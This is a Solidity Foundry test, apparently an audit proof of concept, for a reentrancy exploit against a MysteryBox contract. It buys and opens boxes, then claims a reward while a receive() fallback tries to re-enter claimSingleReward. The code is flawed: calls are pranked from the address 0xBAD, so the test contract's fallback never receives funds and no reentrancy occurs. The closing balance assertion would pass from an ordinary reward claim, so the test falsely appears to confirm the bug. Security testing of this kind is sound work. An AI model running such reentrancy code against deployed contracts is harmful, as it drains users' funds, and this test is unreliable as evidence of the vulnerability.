// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/MysteryBox.sol";

contract ReentrancyExploit2 is Test {
    MysteryBox public mysteryBox;
    address public attacker = address(0xBAD);

    // Fallback function to trigger reentrancy
    receive() external payable {
        if (address(mysteryBox).balance >= 0.1 ether) {
            console.log("Re-entering claimSingleReward");
            mysteryBox.claimSingleReward(0); // Attempt reentrancy
        }
    }

    function setUp() public {
        // Deploy the MysteryBox contract with initial funding
        mysteryBox = new MysteryBox{value: 3 ether}();
        vm.deal(attacker, 1 ether);
        console.log("MysteryBox contract deployed and attacker funded");
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // Buy some boxes
        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.buyBox{value: 0.1 ether}();
        console.log("Attacker bought 3 boxes");

        // Open boxes to get rewards
        mysteryBox.openBox();
        mysteryBox.openBox();
        mysteryBox.openBox();
        console.log("Attacker opened 3 boxes");

        // Check rewards
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        require(rewards.length > 0, "No rewards found");
        console.log("Attacker received %d rewards", rewards.length);

        // Log initial balance
        uint256 initialBalance = address(attacker).balance;
        console.log("Initial Balance of Attacker: %d", initialBalance);

        // Trigger the exploit by claiming a single reward
        try mysteryBox.claimSingleReward(0) {
            console.log("claimSingleReward executed successfully");
        } catch (bytes memory reason) {
            console.log("claimSingleReward failed with reason:");
            console.logBytes(reason);
        }

        // Log the final balance after exploit
        uint256 finalBalance = address(attacker).balance;
        console.log("Final Balance of Attacker: %d", finalBalance);

        // Ensure the exploit increased the attacker's balance
        assert(finalBalance > initialBalance);

        vm.stopPrank();
    }
}
